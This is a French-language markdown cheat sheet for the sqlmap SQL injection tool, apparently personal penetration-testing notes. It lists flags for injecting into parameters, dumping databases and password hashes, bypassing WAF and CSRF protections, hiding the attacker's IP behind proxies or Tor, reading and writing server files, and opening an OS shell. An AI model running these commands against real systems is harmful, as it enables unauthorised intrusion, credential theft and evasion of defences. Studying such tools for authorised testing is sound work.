# SQLMap

---
## Utilisation
* copier la requette dans le navigateur as curl
    ```bash
     # url
     -u <URL>  

     # skip user input by putting defauft
     --batch

     # pour trouver automatiquement les parametres
     --crawl, --forms 

     # specifier le cookie
     --cookie='<MonCookie>'

     # Header
     -H 'Cookie:<MonCookie>' 

     # enregistrer output
     -t <Path> 

     # verbose in terminal
     -v 6 

     # --host, --referer

     # specifier la methode
     --method <NomDeMethode ( PUT, GET ..)>
     
     # afficher les erreurs 
     --parse-errors

     # prefix
     --prefix="<Prefix>"
     
     # suffix
     --suffix="<Suffix>"
    ```

* cas d'un get, on peut fournir la data avec --data 
    ```bash
    sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
    ```
* Indiquer si le parametre est vulnérable 
    ```bash
    # utiliser -p <parametre> ex : -p uid
    # utiliser * dans --data ex :
    sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
    ```

* copier des paramètres
    > utilisation des requettes burps à sauvegarder en txt
    ```bash
    sqlmap -r maRequette.txt
    ```

---
## Énumération de la base de données

```bash 

 # architecture de la db
 --schema 

 # version
 --banner 
 
 # be shure to have the correct content
 --no-cast

 # dumper la db
 --dump | --dump-format html

 # specifier l'user actuel
 --current-user 
 
 # specifier la db actuelle
 --current-db 

 # DUMP PASSWORDS 
 --passwords

 # enumerer toutes les tables
 --tables
 -D <dbName>

 # rechercher 
 --search <AutresTags: -T -C .. >
 # enumerer tout le contenu de la table
 -T <TableName>

 # enumerer des colonnes précises
 -C <ColName>

 # specifier les lignes
 --start=<Nbr> | --stop=<Nbr>

 # enumeration conditionnelle
 --where="<Condition"

 # tout dumper
 --dump-all

 # DO ALL AUTOMATICALY
 --all

 --union-cols=<NbrColonne>
```
---
## Bypassing Web Application Protections

```bash
# Anti-CSRF Token Bypass
--csrf-token="<NomVariableToken>"

# Unique Value Bypass
--randomize=<VarToRandomize>

# Calculated Parameter Bypass
--eval="import hashlib; h=hashlib.md5(id).hexdigest()"


# IP Address Concealing (cacher)
    # show list of proxy
    --proxy-file
    #concealing
    --proxy | --proxy="socks4://177.39.187.70:33283"
    # check if tor is installed
    --check-tor

# WAF Bypass
 --skip-waf

# User-agent Blacklisting Bypass
--random-agent

# Tamper Scripts : specifier un encodage spécifique : ex: space2comment, 
    # list of all temper 
    --list-tampers
    # usage
    --tamper=<tamperName> | --tamper "<tamperName>"

# Miscellaneous Bypasses : chuncked splits the POST request's body
--chunked
```
---
## OS Exploitation

###  File Read/Write
```bash
# Checking for DBA Privileges : si user est admin
--is-dba

# read file 
--file-read "<Path>"

# write file 
--file-write "<FileName>" --file-dest "<PathInTarget>"
```
### OS Command Execution
```bash
# get a reverse shell
--os-shell --technique=<techniqName | E >
```


    